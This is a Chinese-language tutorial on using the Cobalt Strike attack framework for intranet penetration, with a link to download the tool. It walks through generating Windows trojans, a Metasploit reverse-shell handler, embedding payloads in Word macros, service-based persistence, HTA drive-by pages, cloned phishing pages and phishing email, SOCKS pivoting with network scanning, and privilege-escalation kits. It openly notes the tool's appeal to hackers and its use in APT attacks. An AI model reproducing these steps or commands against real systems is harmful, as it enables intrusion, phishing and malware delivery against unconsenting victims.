# 内网安全-CS利器

cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS。最近这个工具大火，成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。

Cobalt Strike分为客户端和服务端可分布式操作可以协同作战。但一定要架设在外网上。当然你知道利用这款工具主要用于内网渗透以及APT攻击。

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29ATlKGc2KcN3LNtcbESDWWY9xlMGflvYZMB1uApanUpz3SN9JYNcicYQw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



CS下载地址：

链接:https://pan.baidu.com/s/1ivdfoGrIvVeXGIUnPQ7K2w 

提取码:bu9h



CS 用户手册 中文翻译

链接:https://pan.baidu.com/s/11T0R0Lz-cSssHJ0rCxIVqw 提取码:tz37

### 一、启动，连接服务器

服务端启动

- 
- 

```
./teamserver    192.168.5.11   123456服务端启动文件   服务端ip       客户端连接密码
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A4SDEgYh2wNWCRtXXFSjBIhwgkDxqiaqdRCoOZds4MBRRucphrYe1hfg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



客户端启动

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AgWAHq9ru4CyVxuiawRO9SicKMHHbYkAEAA9hMkBOTbz41u5syZxll54g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



### 二、主机上线

创建监听器

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AWWKfUKELgPWic1SaXrc4xh2zQzE3RxH0QXdiam0hjPPibl7iawnXhoV9kQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



生成windows 木马

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AWLpqibicribicZJCb7Fia2aSdhibZKogAehKF1I3ZSbyE0CqrZs1axJ6SpqQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



选择刚才创建的监听器

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AR3OHnJjHcrRWicciaRdhnhqOvicxqzy7q2lr3PlSB9MiaiaWSmqCPT6m80g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



保存木马到windows 7 靶机 双击木马 发现目标已上线

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AK9LVIdznm0Llia3Xia75faLnbczKQSiaTtryr97xOArAUXiaLgPUgDib0tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



### 三、结合metasploit,反弹shell

msf 设置payload

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > set lhost 192.168.5.11
lhost => 192.168.5.11
msf6 exploit(multi/handler) > exploit
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AUicUx8Rt3uEia96v6yib8tuUOqkPwqIltYQ6LBhjCZQoSB8oTbV7uIIHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



客户端 右键 

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AEhLU0yAsibPbljM9u37icYznJb2icK28vfZf15tUYbwDGVGNQhiaxBxMjA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A52XTjSa3Z0UbpNIQeico6GoR2P1EOX0BtUGDibRStgw8LnLaeUMPhEcQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

发现已经可以获取shell 了

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A9QK9kQHiaQpby9JY9QGIzuQ8IRb3AKWeq9YhnQuWrpyI3cGVyXZzVTQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



### 四、office宏payload应用

第一步、生成office宏

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AgflU9IMMfTqFnEGKpSdauD7UNeicMsibMK9rKFHEkictpAeXAKGpq94yw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



第二步，把cs生成的代码放到word宏里面去

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AowFMBKLicNcYvutmxtokwUxm6AfbYFgmqonuarWfax23heaDXjUtcbQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

Cs 生成的代码直接放到创建里面去，注意：做试验的时候，宏的位置不要设置所有的活动模板和文档，建设应用在当前文档，不然本机所有word文档运行都会种上你的木马，另外打开word文档有宏提示，一般是word默认禁用所有宏（文件—选项—信任中心—信任中心设置里面配置）。

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A47w0CzETC5y3vJUMDzy0IgGZ0npnUqf9odby84XPdoicCeyg3QNKx5Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



已上线

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29Aw9PCdXzt7l3dHaF2JEFsnuYdJ9HabcvWbxRDAWOpGPwicgVlKiaUVRyw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 五、Https Payload应用 

优点：可能过行为查杀、另外administrator运行可直接提升为system权限

第一步

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A2xUnHQfKx143au3WHAtbRABjRrCiapjOL2gFDIictDYw6xxtHTYhpjXQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



第二步：创建服务



```
Sc create test binpath= ”c:\test.exe” start= auto displayname= ”test”

Sc start test

Sc delete test

Sc top test
```



### 六、信息收集



![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AibvWqXysuI5QvIydsx5OKwG82V7fjKS3yicQBp7z0XSnnMiaNybicaWYbg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A1PSlls9fwtUXic3iaicKkabr4Y1wu4vaIHmJj4j6sSMae69X48NABcepA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

也可以通过https://bitly.com生成url短链接

http://tool.chinaz.com/tools/dwz.aspx

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29APXDicdvn6NbqBicqCSicpVAFYtGYwViazvHPDiaiaib7rvZPWicTZZscsAkgHw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AcgHOjdTXicfh7XpGHTWw9UwQbO0ynkznBCqmaHTupjfZICBG6Ahiad9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 七、hta网页挂马

HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，与VB、C++等程序语言所设计的软件界面没什么差别。

下例代码保存为xx.hta：

This is my first homepage.**This text is bold**



第一步：生成hta

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AtPA84xiaEGmdhLnISDtlvNibT3j17o2k00fcEfGWNmWuic2BH270iaJ19g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29Ak0haaEz8ugnIahVSziam60liaDofhFdAWiaYbQSC3Zs7wwDLBhC92cxrg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

第二步：使用文件下载

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29Agce2PNFcYpTMoMhLiaQsSglMOBlzwtsy956TrBDibWtDbW5uiaERTkqwQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29Ac09lmnQUZ9J1keaV3YswAzqhde2zbI5jpmFX6KEjVNaJorNsk1Kuqw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

点击开始之后，evil.hta文件会自动传到cs uploads目录。

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A4sibD37WIbltfY6Un9ibe7u8ZqwNzQP8lgx7sOblIS08OlpszLl7yq2g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AUj9Cejgae9RbiaWvBBkHZMbKlria2sT8tEFn4Pc12UQZbB3vbuy9HkiaQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如果之前设置过钓鱼页面，记得一定要删掉，不然会克隆的时候会报错

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AfW3o0KQhm6Z5uabtxQo5dUBDtkqRorib2mCVRGvickx3MtG3WQmMG1ibA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A7YzibzoWk8DtHl352H4y2icjqsapRlNRNQnt1ic2FcPhD6Vprdib0jSBtw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



### 八、钓鱼页面应用

同上



### 九、邮件钓鱼



![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A0sGL9TFufrWNXwVjAM17UTyWpu4oaNlTcAZAY8MmsWdHCqeSBZTNWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)











![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A0HlI45Wib9A0rx5gVxia8ZPy7KNbJq6snxDSAvvubNXbdkCsc9Pro8dQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



注意，目标邮件内容

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AENWg1Mn8gicKYoIEbFQZjsOX3huzrUUbKO1uY5A43fPOuyIGoEyu97g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29APcYOiaxtfaiayFpZs8P3rsGpLZNNvQRxeg7AStj7G3f74hQ9FxDOPT8w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AzrecEYe8TuavLC9bT7qDBQiay5qCMX4GaZCKWzbXibNkIW2futmZEzmw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 十、beacon控制台的基本使用

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29A7bLiaPeK9Z3ibLibeicDV7HmcQyvFqZ2fUZ7sW2aTeC78lTiaVL7JSb04Lw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

Help

Help shell



### 十一、Socks代理应用



第一步：设置代理端口

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AKicgADKkp26PfWuTyOTduibSp9MYdcicGgQXjGLUCFPwudMKd1SF2yFIA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



第二步：查看已搭建代理

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29Aeibasgm6tHf5lzFXXo4wx0hB0X3O5fvduE64r82t8jVsWDfVmhMpNibw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



第三步：利用msf模块直接攻击



![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AdwH903HXEoTCe0pmGasSP6d5icsMJ0uXVfcxuD0vg4ibIBHzDQMEdpHQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AvFJl2OTRsLfspa92AC2NoQiaO9VRanhLSfeydicicOyGH3erKARsOiaB2Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29ACAtEeLkCAsd9eI3bxd7xiaEoWqAYMWEulokicZ2yLqibe4oTicfwzgotvA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

setg Proxies socks4:192.168.0.106:6677

也可以使用下面方法：

开启socks4a代理，通过代理进行内网渗透

开启socks，可以通过命令，也可以通过右键Pivoting->SOCKS Server



beacon> socks 2222

[+] started SOCKS4a server on: 2222

[+] host called home, sent: 16 bytes

然后vim /etc/proxychains.conf ，在文件末尾添加socks4代理服务器

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AmCr28Xd0kTmqfL6dqmg8ymUXQUIt4HORFNY4grxGEhqL45ianY1RP6w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

使用proxychains代理扫描内网主机  proxychains nmap -sP 172.16.0.0/24

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AIUgjrAxOUIImFTc8FVJBpRtIP8UpficqQ5lqYSxmO6tco7OZoZMicFQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



### 十二、cs提权与内网渗透

https://github.com/rsmudge/Elevatekit

https://k8gege.org/Download/

https://github.com/k8gege/Aggressor

![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29Aj3wH2jWyRhJGficGLzCTpw9WTUWWfIuUC6d5R48vJQjDYrSstdM3Saw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQaePcE9VAbUPQiadAm7ze29AMicH3nHLMW60HesYRwt5pPpeALB5cv4ByibAQCVIs30rHVsKEEKjkD8g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)